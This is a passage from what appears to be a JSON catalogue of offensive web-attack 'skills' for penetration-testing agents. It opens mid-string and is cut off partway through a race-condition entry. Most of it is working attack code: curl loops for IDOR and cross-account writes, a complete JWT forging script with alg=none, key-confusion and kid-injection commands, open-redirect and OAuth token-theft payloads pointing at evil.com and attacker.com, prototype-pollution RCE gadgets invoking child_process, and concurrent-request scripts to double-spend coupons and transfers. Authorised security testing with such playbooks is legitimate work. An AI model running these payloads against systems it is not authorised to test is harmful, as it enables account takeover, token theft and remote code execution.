hing and cross-boundary writes. Reach for it when you hold two accounts of different privilege against user-scoped API endpoints.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-idor-automation/SKILL.md","summary":"Systematically test all API endpoints for Insecure Direct Object Reference vulnerabilities using two accounts with different privilege levels.","file":"acordia-operators/skills/attack-idor-automation/SKILL.md","used_by":["mobile-application","web-application"],"intro":"<p># IDOR Automated Testing</p>","secs":[{"t":"Objective","h":"<p>Systematically test all API endpoints for Insecure Direct Object Reference vulnerabilities using two accounts with different privilege levels.</p>","n":142},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Set Up Two Accounts</h4><ol class=\"ml\"><li><strong>Account A</strong> (victim) — owns resources being tested</li><li><strong>Account B</strong> (attacker) — tries to access Account A's resources</li></ol><h4 class=\"mh\">Phase 2: Automated Cross-Account Testing</h4><pre class=\"code\" data-lang=bash><code># Test endpoints from file — curl loop hitting each endpoint with both tokens\n# and diffing the responses\nwhile IFS= read -r endpoint; do\n  code_a=$(curl -s -o /tmp/resp_a.json -w &quot;%{http_code}&quot; \\\n    -H &quot;Authorization: Bearer VICTIM_JWT&quot; &quot;$endpoint&quot;)\n  code_b=$(curl -s -o /tmp/resp_b.json -w &quot;%{http_code}&quot; \\\n    -H &quot;Authorization: Bearer ATTACKER_JWT&quot; &quot;$endpoint&quot;)\n  echo &quot;$endpoint  victim=$code_a  attacker=$code_b&quot;\n  diff /tmp/resp_a.json /tmp/resp_b.json &amp;&amp; echo &quot;  identical response — possible IDOR&quot;\ndone &lt; endpoints.txt\n\n# Test comma-separated endpoints\nIFS=',' read -ra EPS &lt;&lt;&lt; &quot;https://TARGET/api/users/123,https://TARGET/api/orders/456,https://TARGET/api/profile/123&quot;\nfor endpoint in &quot;${EPS[@]}&quot;; do\n  curl -s -o /dev/null -w &quot;%{http_code} $endpoint\\n&quot; \\\n    -X GET -H &quot;Authorization: Bearer ATTACKER_JWT&quot; &quot;$endpoint&quot;\ndone\n\n# Test write operations\nwhile IFS= read -r endpoint; do\n  curl -s -X PUT -H &quot;Authorization: Bearer ATTACKER_JWT&quot; \\\n    -H &quot;Content-Type: application/json&quot; \\\n    -d '{&quot;name&quot;:&quot;pwned&quot;}' &quot;$endpoint&quot;\ndone &lt; endpoints.txt</code></pre><h4 class=\"mh\">Phase 3: Manual Testing Patterns</h4><p><strong>Horizontal IDOR (same role, different user):</strong></p><pre class=\"code\" data-lang=bash><code># Sequential IDs\ncurl -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/1\ncurl -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/2\n\n# UUID guessing (if predictable)\ncurl -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/UUID_OF_OTHER_USER\n\n# Endpoint enumeration\nfor id in $(seq 1 100); do\n  curl -s -o /dev/null -w &quot;%{http_code} &quot; -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; &quot;https://TARGET/api/orders/$id&quot;\ndone\n\n# UUID/GUID swap — capture another user's UUID from an earlier response instead of\n# guessing it, then substitute it into /api/profile/{uuid}, /api/orders/{uuid}\n\n# Cookie-session applications: replace the bearer header with the session cookie,\n# e.g. -H &quot;Cookie: session=LOW_PRIV_SESSION&quot;</code></pre><p><strong>Vertical IDOR (low-priv accessing high-priv):</strong></p><pre class=\"code\" data-lang=bash><code># User accessing admin endpoints\ncurl -H &quot;Authorization: Bearer USER_TOKEN&quot; https://TARGET/api/admin/users\ncurl -H &quot;Authorization: Bearer USER_TOKEN&quot; https://TARGET/api/admin/settings\ncurl -H &quot;Authorization: Bearer USER_TOKEN&quot; https://TARGET/api/internal/reports</code></pre><h4 class=\"mh\">Phase 4: HTTP Method Switching</h4><pre class=\"code\" data-lang=bash><code># GET blocked but DELETE works\ncurl -X DELETE -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/VICTIM_ID\n\n# GET blocked but PATCH works\ncurl -X PATCH -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/VICTIM_ID \\\n  -d '{&quot;email&quot;:&quot;attacker@evil.com&quot;}'\n\n# GET blocked but POST works\ncurl -X POST -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; https://TARGET/api/users/VICTIM_ID</code></pre><h4 class=\"mh\">Phase 5: Parameter Pollution</h4><pre class=\"code\" data-lang=bash><code># Dual ID injection\ncurl &quot;https://TARGET/api/profile?user_id=ATTACKER&amp;user_id=VICTIM&quot;\n\n# Body override\ncurl -X POST https://TARGET/api/transfer \\\n  -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; \\\n  -d '{&quot;from&quot;:&quot;VICTIM_ID&quot;,&quot;to&quot;:&quot;ATTACKER_ID&quot;,&quot;amount&quot;:1000}'\n\n# Parameter-based IDOR — swap the object reference in the body or query string:\n# user_id, account_id, order_id; and the authorisation fields role, group_id, org_id</code></pre><h4 class=\"mh\">Phase 6: Response Comparison</h4><pre class=\"code\" data-lang=bash><code># Compare responses between two auth contexts\ndiff &lt;(curl -s -H &quot;Authorization: Bearer VICTIM_TOKEN&quot; &quot;https://TARGET/api/users/VICTIM_ID&quot;) \\\n     &lt;(curl -s -H &quot;Authorization: Bearer ATTACKER_TOKEN&quot; &quot;https://TARGET/api/users/VICTIM_ID&quot;)</code></pre>","n":3650},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Read other user's PII (email, SSN, etc.)</td><td>Critical (P1)</td></tr><tr><td>Modify other user's data</td><td>Critical (P1)</td></tr><tr><td>Delete other user's resources</td><td>Critical (P1)</td></tr><tr><td>Access admin functionality</td><td>Critical (P1)</td></tr><tr><td>Read non-sensitive data of other user</td><td>Medium (P3)</td></tr></tbody></table></div>","n":304},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Two different auth tokens used</li><li>Endpoint tested</li><li>Account A (victim) response as baseline</li><li>Account B (attacker) accessing Account A's resource</li><li>Data received proving cross-account access</li></ul>","n":191},{"t":"Tools","h":"<ul class=\"ml\"><li>curl loop over an endpoint list with two tokens (see Phase 2) — automated cross-account testing</li><li><code>diff</code> on two curl responses (see Phase 6) — response comparison</li><li>the python3 JWT-forging snippet from attack-jwt, or <code>jwt_tool</code> — token manipulation for IDOR</li></ul>","n":259},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References\" target=\"_blank\" rel=\"noopener\">OWASP: IDOR</a></li><li><a href=\"https://portswigger.net/web-security/access-control/idor\" target=\"_blank\" rel=\"noopener\">PortSwigger: Access Control</a></li></ul>","n":279}],"m":{"name":22,"desc":361,"body":4982,"file":5539,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.3},"name":{"lim":64,"pct":34.4}}}},"attack-jwt":{"slug":"attack-jwt","pillar":"operators","name":"attack-jwt","description":"Forge a JSON Web Token the server will accept — alg=none, weak HMAC secret cracking, RS256-to-HS256 key confusion, and kid, jku and jwk header injection — then escalate the claims carried inside it. Reach for it when authentication rides on a bearer token you can decode.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-jwt/SKILL.md","summary":"Exploit JWT implementation weaknesses to bypass authentication, escalate privileges, or forge tokens.","file":"acordia-operators/skills/attack-jwt/SKILL.md","used_by":["mobile-application","web-application"],"intro":"<p># JWT Token Attack</p>","secs":[{"t":"Objective","h":"<p>Exploit JWT implementation weaknesses to bypass authentication, escalate privileges, or forge tokens.</p>","n":101},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Decode &amp; Analyze</h4><pre class=\"code\" data-lang=bash><code># Automated JWT analysis — jwt_tool (ask the user before installing if missing)\njwt_tool EYTOKEN\n\n# Manual decode\necho &quot;HEADER.PAYLOAD.SIG&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null\necho &quot;HEADER.PAYLOAD.SIG&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .</code></pre><p>Check for:</p><ul class=\"ml\"><li>Algorithm (<code>alg</code> field): RS256, HS256, none</li><li>Claims: <code>role</code>, <code>is_admin</code>, <code>sub</code>, <code>exp</code>, <code>aud</code>, <code>iss</code></li><li>Key ID (<code>kid</code>): SQL injection, path traversal potential</li></ul><p>All tamper commands below use a small reusable forging script — save it once:</p><pre class=\"code\" data-lang=bash><code>cat &gt; /tmp/jwt_forge.py &lt;&lt;'EOF'\n#!/usr/bin/env python3\n&quot;&quot;&quot;Decode a JWT, tamper header/payload claims, and re-encode (alg=none or HS256-signed).&quot;&quot;&quot;\nimport argparse, base64, json, hmac, hashlib\n\ndef b64u(data: bytes) -&gt; str:\n    return base64.urlsafe_b64encode(data).rstrip(b&quot;=&quot;).decode()\n\ndef b64u_decode(s: str) -&gt; bytes:\n    return base64.urlsafe_b64decode(s + &quot;=&quot; * (-len(s) % 4))\n\np = argparse.ArgumentParser()\np.add_argument(&quot;token&quot;)\np.add_argument(&quot;--header&quot;, action=&quot;append&quot;, default=[], help=&quot;k=v, applied to the JWT header&quot;)\np.add_argument(&quot;--payload&quot;, action=&quot;append&quot;, default=[], help=&quot;k=v, applied to the JWT payload&quot;)\np.add_argument(&quot;--sign&quot;, choices=[&quot;none&quot;, &quot;hs256&quot;], default=&quot;none&quot;)\np.add_argument(&quot;--key&quot;, help=&quot;path to secret/PEM file, required for --sign hs256&quot;)\nargs = p.parse_args()\n\nh_b64, p_b64, _ = args.token.split(&quot;.&quot;)\nheader = json.loads(b64u_decode(h_b64))\npayload = json.loads(b64u_decode(p_b64))\n\nfor kv in args.header:\n    k, v = kv.split(&quot;=&quot;, 1)\n    header[k] = v\nfor kv in args.payload:\n    k, v = kv.split(&quot;=&quot;, 1)\n    payload[k] = v\n\nif args.sign == &quot;none&quot;:\n    header[&quot;alg&quot;] = &quot;none&quot;\n\nnew_h, new_p = b64u(json.dumps(header).encode()), b64u(json.dumps(payload).encode())\nsigning_input = f&quot;{new_h}.{new_p}&quot;.encode()\n\nif args.sign == &quot;hs256&quot;:\n    key = open(args.key, &quot;rb&quot;).read()\n    sig = b64u(hmac.new(key, signing_input, hashlib.sha256).digest())\nelse:\n    sig = &quot;&quot;\n\nprint(f&quot;{new_h}.{new_p}.{sig}&quot;)\nEOF</code></pre><h4 class=\"mh\">Phase 2: Algorithm Attacks</h4><pre class=\"code\" data-lang=bash><code># Generate alg=none token\npython3 /tmp/jwt_forge.py EYTOKEN --sign none\n\n# Role escalation\npython3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign none\n\n# User ID swap\npython3 /tmp/jwt_forge.py EYTOKEN --payload sub=1 --sign none\n\n# HS256 with known/weak key\npython3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key &lt;(echo -n &quot;secret&quot;)\n\n# Manual header encoding, where python3 is unavailable\n# Header: {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}\necho -n '{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}' | base64 | tr -d '=' | tr '+/' '-_'</code></pre><h4 class=\"mh\">Phase 3: Key Confusion (RS256 → HS256)</h4><p>If server uses RS256, try signing with the public key as HS256 secret:</p><pre class=\"code\" data-lang=bash><code># Fetch public key\ncurl -s https://TARGET/.well-known/jwks.json\n\n# Convert JWK to PEM (e.g. via jwt_tool's JWK-to-PEM helper or manual conversion),\n# then sign HS256 using the PEM bytes as the HMAC secret\npython3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key public.pem\n\n# jwt_tool equivalent — key confusion using the PEM public key as the HMAC secret\njwt_tool JWT_TOKEN -X k -pk public.pem</code></pre><h4 class=\"mh\">Phase 4: kid Injection</h4><pre class=\"code\" data-lang=bash><code># SQL injection via kid\npython3 /tmp/jwt_forge.py EYTOKEN --header 'kid=../../../../../../dev/null'\n\n# kid pointing to accessible file\npython3 /tmp/jwt_forge.py EYTOKEN --header 'kid=/proc/sys/kernel/hostname'\n\n# jwt_tool equivalent — inject kid, then re-sign HS256 with an empty key\njwt_tool JWT_TOKEN -I -hc kid -hv &quot;../../dev/null&quot; -S hs256 -p &quot;&quot;</code></pre><h4 class=\"mh\">Phase 5: Weak Secret Cracking</h4><pre class=\"code\" data-lang=bash><code># Brute force an HS256 signing secret from a wordlist\nhashcat -a 0 -m 16500 JWT_TOKEN wordlist.txt\n\n# Or with jwt_tool\njwt_tool JWT_TOKEN -C -d wordlist.txt</code></pre><h4 class=\"mh\">Phase 6: jwk Header Injection</h4><p>Embed an attacker-generated public key in the token's own <code>jwk</code> header and sign with the matching private key. A server that trusts the embedded key accepts the forgery without ever consulting its own key store.</p><pre class=\"code\" data-lang=bash><code>jwt_tool JWT_TOKEN -X i</code></pre><h4 class=\"mh\">Phase 7: Verify Impact</h4><pre class=\"code\" data-lang=bash><code># Test tampered token\ncurl -s -H &quot;Authorization: Bearer TAMPERED_TOKEN&quot; https://TARGET/api/admin/users</code></pre>","n":4130},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Attack</th><th>Severity</th></tr></thead><tbody><tr><td>alg=none accepted — auth bypass</td><td>Critical (P1)</td></tr><tr><td>Role escalation via claim tampering</td><td>Critical (P1)</td></tr><tr><td>RS256→HS256 key confusion</td><td>Critical (P1)</td></tr><tr><td>Weak signing key (crackable)</td><td>High (P2)</td></tr><tr><td>kid SQL injection</td><td>Critical (P1)</td></tr><tr><td>Expired tokens accepted</td><td>Medium (P3)</td></tr></tbody></table></div>","n":322},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Original JWT decoded (header + payload)</li><li>Tampered JWT with modified claims</li><li>Server response accepting tampered token</li><li>Proof of elevated access (admin data, other user data)</li></ul>","n":177},{"t":"Tools","h":"<ul class=\"ml\"><li><code>/tmp/jwt_forge.py</code> (python3, defined in Phase 1) or <code>jwt_tool</code> — automated decode/tamper/re-encode</li><li><code>jwt_tool</code> (external) — comprehensive JWT testing</li><li><code>hashcat -m 16500</code> — JWT secret cracking</li></ul>","n":196},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/jwt\" target=\"_blank\" rel=\"noopener\">PortSwigger: JWT Attacks</a></li><li><a href=\"https://tools.ietf.org/html/rfc7519\" target=\"_blank\" rel=\"noopener\">RFC 7519 - JSON Web Token</a></li></ul>","n":137}],"m":{"name":10,"desc":271,"body":5214,"file":5657,"dband":"under","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":26.5},"name":{"lim":64,"pct":15.6}}}},"attack-open-redirect":{"slug":"attack-open-redirect","pillar":"operators","name":"attack-open-redirect","description":"Point a server-side redirect at a domain you control — protocol-relative, encoded, double-encoded, backslash and at-sign payloads against url, next, returnTo, callback and redirect_uri parameters, escalating to OAuth token theft where the callback is unvalidated. Reach for it when a login, logout or callback parameter carries a URL.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-open-redirect/SKILL.md","summary":"Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.","file":"acordia-operators/skills/attack-open-redirect/SKILL.md","used_by":["web-application"],"intro":"<p># Open Redirect</p>","secs":[{"t":"Objective","h":"<p>Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.</p>","n":130},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify Redirect Parameters</h4><p>Common parameter names:</p><pre class=\"code\"><code>url, redirect, redirect_url, redirect_uri, return, return_url, returnTo,\nnext, goto, target, dest, destination, rurl, redir, forward, continue,\ncallback, path, out, view, login_url, image_url, go, link, ref</code></pre><h4 class=\"mh\">Phase 2: Basic Payloads</h4><pre class=\"code\" data-lang=bash><code># Direct redirect\ncurl -s -D- &quot;https://TARGET/redirect?url=https://evil.com&quot;\n\n# Protocol-relative\ncurl -s -D- &quot;https://TARGET/redirect?url=//evil.com&quot;\n\n# Encoded\ncurl -s -D- &quot;https://TARGET/redirect?url=https%3A%2F%2Fevil.com&quot;\n\n# Backslash bypass\ncurl -s -D- &quot;https://TARGET/redirect?url=https://evil.com\\@TARGET&quot;\n\n# At-sign bypass\ncurl -s -D- &quot;https://TARGET/redirect?url=https://TARGET@evil.com&quot;</code></pre><h4 class=\"mh\">Phase 3: Filter Bypass</h4><pre class=\"code\" data-lang=bash><code># Subdomain matching\ncurl -s -D- &quot;https://TARGET/redirect?url=https://TARGET.evil.com&quot;\n\n# URL encoding tricks\ncurl -s -D- &quot;https://TARGET/redirect?url=https://evil.com%23.TARGET&quot;\n\n# Double encoding\ncurl -s -D- &quot;https://TARGET/redirect?url=https://%65%76%69%6c.com&quot;\n\n# Null byte\ncurl -s -D- &quot;https://TARGET/redirect?url=https://evil.com%00.TARGET&quot;\n\n# CRLF + Location header\ncurl -s -D- &quot;https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com&quot;\n\n# JavaScript scheme\ncurl -s -D- &quot;https://TARGET/redirect?url=javascript:alert(document.domain)&quot;\n\n# Data URI\ncurl -s -D- &quot;https://TARGET/redirect?url=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h4 class=\"mh\">Phase 4: OAuth Token Theft</h4><pre class=\"code\" data-lang=bash><code># Test OAuth redirect_uri handling — curl requesting the authorize endpoint\n# with an attacker-controlled redirect_uri\ncurl -s -D- &quot;https://TARGET/oauth/authorize?client_id=CLIENT_ID&amp;response_type=code&amp;redirect_uri=https://attacker.com/callback&amp;scope=openid&quot;\n\n# Sweep redirect_uri bypass variants: attacker domain, subdomain, path-relative,\n# and traversal-based domain confusion\nfor uri in &quot;https://attacker.com&quot; &quot;https://TARGET.attacker.com&quot; \\\n           &quot;https://TARGET/callback.attacker.com&quot; &quot;https://TARGET/callback/../../attacker.com&quot;; do\n  echo &quot;redirect_uri: $uri&quot;\n  curl -s -D- -o /dev/null \\\n    &quot;https://TARGET/oauth/authorize?client_id=CLIENT_ID&amp;response_type=code&amp;redirect_uri=$uri&amp;scope=openid&quot; \\\n    | grep -i &quot;location&quot;\ndone</code></pre><p>If redirect_uri accepts attacker domain, the OAuth code/token is sent to the attacker.</p><h4 class=\"mh\">Phase 5: Impact Escalation</h4><ul class=\"ml\"><li>Redirect in login flow → credential phishing</li><li>Redirect in OAuth flow → token theft (P1)</li><li>Redirect in email verification → account takeover</li><li>Redirect + SSRF → internal access</li></ul>","n":2490},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Open redirect + OAuth token theft</td><td>Critical (P1)</td></tr><tr><td>Open redirect in login/auth flow</td><td>High (P2)</td></tr><tr><td>Generic open redirect</td><td>Medium (P3)</td></tr><tr><td>JavaScript scheme redirect (XSS)</td><td>High (P2)</td></tr></tbody></table></div>","n":237},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>URL with redirect parameter and payload</li><li>Response showing 302/301 to attacker domain</li><li>For OAuth: stolen authorization code/token</li><li>Location header value in response</li></ul>","n":168},{"t":"Tools","h":"<ul class=\"ml\"><li>curl loop against the authorize endpoint (see Phase 4) — OAuth redirect_uri bypass testing</li><li><code>curl</code> — manual redirect testing</li></ul>","n":127},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/kb/issues/00500100_open-redirection-reflected\" target=\"_blank\" rel=\"noopener\">PortSwigger: Open Redirect</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\" target=\"_blank\" rel=\"noopener\">OWASP: Unvalidated Redirects</a></li></ul>","n":234}],"m":{"name":20,"desc":334,"body":3534,"file":4060,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":32.6},"name":{"lim":64,"pct":31.2}}}},"attack-prototype-pollution":{"slug":"attack-prototype-pollution","pillar":"operators","name":"attack-prototype-pollution","description":"Pollute Object.prototype through deep-merged or recursively assigned input — __proto__ and constructor.prototype keys in query strings, JSON bodies and config patches — then chain a gadget to XSS, privilege escalation or child_process code execution. Reach for it when the target is Node.js or browser JavaScript that merges caller-supplied objects.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-prototype-pollution/SKILL.md","summary":"Exploit JavaScript prototype pollution to modify Object.prototype, leading to XSS, privilege escalation, or RCE via gadget chains.","file":"acordia-operators/skills/attack-prototype-pollution/SKILL.md","used_by":["web-application"],"intro":"<p># Prototype Pollution</p>","secs":[{"t":"Objective","h":"<p>Exploit JavaScript prototype pollution to modify Object.prototype, leading to XSS, privilege escalation, or RCE via gadget chains.</p>","n":130},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Client-Side Detection</h4><p><strong>URL-based pollution:</strong></p><pre class=\"code\"><code>https://TARGET/?__proto__[polluted]=1\nhttps://TARGET/?__proto__.polluted=1\nhttps://TARGET/?constructor[prototype][polluted]=1\nhttps://TARGET/#__proto__[polluted]=1</code></pre><p>Verify in browser console:</p><pre class=\"code\" data-lang=javascript><code>console.log(({}).polluted) // Should print &quot;1&quot; if vulnerable</code></pre><h4 class=\"mh\">Phase 2: JSON Body Pollution</h4><pre class=\"code\" data-lang=bash><code># Merge/patch endpoints\ncurl -X POST https://TARGET/api/settings \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}'\n\ncurl -X PATCH https://TARGET/api/user/profile \\\n  -d '{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;role&quot;: &quot;admin&quot;}}}'\n\n# Nested object merge\ncurl -X PUT https://TARGET/api/config \\\n  -d '{&quot;a&quot;: {&quot;__proto__&quot;: {&quot;polluted&quot;: true}}}'</code></pre><h4 class=\"mh\">Phase 3: Server-Side Detection (Node.js)</h4><pre class=\"code\" data-lang=bash><code># RCE via child_process gadget\ncurl -X POST https://TARGET/api/merge \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;__proto__&quot;: {&quot;shell&quot;: &quot;/proc/self/exe&quot;, &quot;argv0&quot;: &quot;console.log(require(\\&quot;child_process\\&quot;).execSync(\\&quot;id\\&quot;).toString())&quot;, &quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;}}'\n\n# EJS template gadget\ncurl -X POST https://TARGET/api/settings \\\n  -d '{&quot;__proto__&quot;: {&quot;outputFunctionName&quot;: &quot;x;process.mainModule.require(\\&quot;child_process\\&quot;).execSync(\\&quot;id\\&quot;);s&quot;}}'\n\n# Handlebars gadget\ncurl -X POST https://TARGET/api/settings \\\n  -d '{&quot;__proto__&quot;: {&quot;type&quot;: &quot;Program&quot;, &quot;body&quot;: [{&quot;type&quot;: &quot;MustacheStatement&quot;, &quot;params&quot;: [], &quot;path&quot;: {&quot;type&quot;: &quot;PathExpression&quot;, &quot;original&quot;: &quot;constructor&quot;}}]}}'</code></pre><h4 class=\"mh\">Phase 4: Client-Side Gadgets</h4><p>Common DOM gadgets when <code>Object.prototype</code> is polluted:</p><pre class=\"code\" data-lang=javascript><code>// innerHTML gadget\nObject.prototype.innerHTML = '&lt;img src=x onerror=alert(1)&gt;'\n\n// src gadget\nObject.prototype.src = 'javascript:alert(1)'\n\n// href gadget\nObject.prototype.href = 'javascript:alert(1)'\n\n// data-* attributes\nObject.prototype['data-tooltip'] = '&lt;img src=x onerror=alert(1)&gt;'</code></pre><h4 class=\"mh\">Phase 5: Framework-Specific</h4><p><strong>Express.js / Pug:</strong></p><pre class=\"code\" data-lang=json><code>{&quot;__proto__&quot;: {&quot;block&quot;: {&quot;type&quot;: &quot;Text&quot;, &quot;val&quot;: &quot;x]));process.exit()//&quot;}}}</code></pre><p><strong>Lodash merge:</strong></p><pre class=\"code\" data-lang=json><code>{&quot;__proto__&quot;: {&quot;polluted&quot;: true}}</code></pre>","n":2111},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Server-side RCE via prototype pollution gadget</td><td>Critical (P1)</td></tr><tr><td>Privilege escalation (isAdmin=true)</td><td>Critical (P1)</td></tr><tr><td>Client-side XSS via DOM gadget</td><td>High (P2)</td></tr><tr><td>Prototype pollution without known gadget</td><td>Medium (P3)</td></tr></tbody></table></div>","n":274},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Endpoint accepting merge/deep-copy of user input</li><li>Payload sent (__proto__ or constructor.prototype)</li><li>Proof of pollution (new property on empty object)</li><li>For RCE: command output</li><li>For XSS: JavaScript execution proof</li></ul>","n":218},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/prototype-pollution\" target=\"_blank\" rel=\"noopener\">PortSwigger: Prototype Pollution</a></li><li><a href=\"https://portswigger.net/research/server-side-prototype-pollution\" target=\"_blank\" rel=\"noopener\">Server-Side Prototype Pollution</a></li></ul>","n":196}],"m":{"name":26,"desc":349,"body":3071,"file":3624,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.1},"name":{"lim":64,"pct":40.6}}}},"attack-race-condition":{"slug":"attack-race-condition","pillar":"operators","name":"attack-race-condition","description":"Release concurrent requests through one synchronised barrier to break a time-of-check-to-time-of-use assumption — coupons redeemed twice, duplicated transfers, repeated one-time claims, over-drawn inventory and limits that only hold sequentially. Reach for it when a state-changing operation validates and then commits without a lock.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-race-condition/SKILL.md","summary":"Exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities by sending concurrent requests that bypass server-side validation.","file":"acordia-operators/skills/attack-race-condition/SKILL.md","used_by":["mobile-application","web-application"],"intro":"<p># Race Condition / TOCTOU Attack</p>","secs":[{"t":"Objective","h":"<p>Exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities by sending concurrent requests that bypass server-side validation.</p>","n":128},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify Targets</h4><p>State-changing operations vulnerable to race conditions:</p><ul class=\"ml\"><li>Coupon/promo code redemption</li><li>Fund transfers / payments</li><li>Vote/like systems</li><li>Account creation (duplicate)</li><li>Inventory purchase</li><li>Password/email change</li><li>File operations</li></ul><h4 class=\"mh\">Phase 2: Automated Race Testing</h4><pre class=\"code\" data-lang=bash><code># Basic race test — 20 requests released simultaneously via a synchronized barrier\npython3 - &lt;&lt;'PY'\nimport concurrent.futures, threading, json, urllib.request\n\nurl = &quot;https://TARGET/api/redeem&quot;\nheaders = {&quot;Authorization&quot;: &quot;Bearer TOKEN&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;}\nbody = b'{&quot;coupon&quot;:&quot;DISCOUNT50&quot;}'\ncount = 20\nbarrier = threading.Barrier(count)\n\ndef fire(_):\n    barrier.wait()  # release every thread at the same instant\n    req = urllib.request.Request(url, data=body, headers=headers, method=&quot;POST&quot;)\n    try:\n        with urllib.request.urlopen(req) as r:\n            return r.status, len(r.read())\n    except urllib.error.HTTPError as e:\n        return e.code, len(e.read())\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=count) as ex:\n    print(json.dumps(list(ex.map(fire, range(count)))))\nPY\n\n# With delay (staggered) — 50 requests, 5s between each\nfor i in $(seq 1 50); do\n  curl -s -o /dev/null -w &quot;%{http_code}\\n&quot; -X POST https://TARGET/api/transfer \\\n    -H &quot;Authorization: Bearer TOKEN&quot; \\\n    -d '{&quot;to&quot;:&quot;attacker&quot;,&quot;amount&quot;:100}'\n  sleep 5\ndone</code></pre><h4 class=\"mh\">Phase 3: Single-Packet Attack (Turbo Intruder)</h4><p>For critical timing, send all requests in a single TCP packet:</p><pre class=\"code\" data-lang=bash><code># Using curl with parallel connections\nfor i in $(seq 1 20); do\n  curl -s -X POST https://TARGET/api/redeem \\\n    -H &quot;Authorization: Bearer TOKEN&quot; \\\n    -d '{&quot;coupon&quot;:&quot;DISCOUNT50&quot;}' &amp;\ndone\nwait</code></pre><h4 class=\"mh\">Phase 4: Analysis</h4><p>Look for:</p><ul class=\"ml\"><li>Multiple successful responses (coupon applied 2+ times)</li><li>Balance inconsistencies</li><li>Duplicate records created</li><li>Response length/status variations indicating multiple successes</li></ul><h4 class=\"mh\">Phase 5: Limit Bypass Race</h4><pre class=\"code\" data-lang=bash><code># Race on rate-limited endpoint — 30 concurrent login attempts\nfor i in $(seq 1 30); do\n  curl -s -o /dev/null -w &quot;%{http_code}\\n&quot; -X POST https://TARGET/api/login \\\n    -d '{&quot;email&quot;:&quot;victim@test.com&quot;,&quot;password&quot;:&quot;guess1&quot;}' &amp;\ndone\nwait\n\n# Race on one-time action — 20 concurrent bonus claims\nfor i in $(seq 1 20); do\n  curl -s -o /dev/null -w &quot;%{http_code}\\n&quot; -X POST https://TARGET/api/claim-bonus \\\n    -H &quot;Authorization: Bearer TOKEN&quot; &amp;\ndone\nwait</code></pre>","n":2413},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Financial: double-spend, duplicate transfer</td><td>Critical (P1)</td></tr><tr><td>Coupon/code reused multiple times</td><td>High (P2)</td></tr><tr><td>Rate limit bypassed via race</td><td>Medium (P3)</td></tr><tr><td>Duplicate record creation</td><td>Medium (P3)</td></tr><tr><td>Vote/like manipulation</td><td>Low (P4)</td></tr></tbody></table></div>","n":288},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Target endpoint and parameters</li><li>Number of concurrent requests</li><li>Multiple successful responses proving race succeeded</li><li>Business impact (e.g., coupon applied twice, balance 